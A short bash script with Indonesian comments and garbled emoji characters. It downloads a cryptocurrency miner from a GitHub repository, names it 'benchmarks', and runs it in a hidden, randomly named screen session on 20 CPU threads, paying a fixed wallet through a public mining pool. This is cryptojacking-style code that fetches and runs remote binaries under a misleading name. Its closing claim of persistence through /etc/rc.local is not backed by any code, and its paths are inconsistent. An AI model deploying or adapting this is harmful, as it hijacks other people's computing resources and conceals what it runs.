#!/bin/bash
echo "ğŸ“¦ Menginstal dependensi..."
apt-get update && apt-get install -y screen wget tar

# Membuat 5 huruf acak
RAND=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 5)

echo "ğŸ“ Menyimpan skrip mining ke /root/benchmarks.sh..."
cat << EOF > /root/benchmarks.sh
#!/bin/bash

cd /root || exit

# Download miner jika belum ada
if [ ! -f benchmarks ]; then
  echo "â¬‡ï¸ Mengunduh file benchmarks..."
  git clone https://github.com/amirul5656/yui56.git
  cd yui56
  chmod +x benchmarks
fi

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3-${RAND}; then
  echo "âš ï¸  Screen 'amirul3-${RAND}' sudah jalan, skip."
else
  echo "â–¶ Menjalankan mining di screen 'amirul3-${RAND}'..."
  screen -dmS amirul3-${RAND} bash -c '
    while true; do
      ./benchmarks --algorithm randomscash --pool stratum-asia.rplant.xyz:7019 -u scash1qadxmcz7w0sn6ketn9nts344xdrs2tca6n55jj0 --cpu-threads 20
      sleep 2
    done
  '
fi
EOF

chmod +x /root/benchmarks.sh

echo "ğŸš€ Menjalankan miner sekarang..."
bash /root/benchmarks.sh

echo "âœ… Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
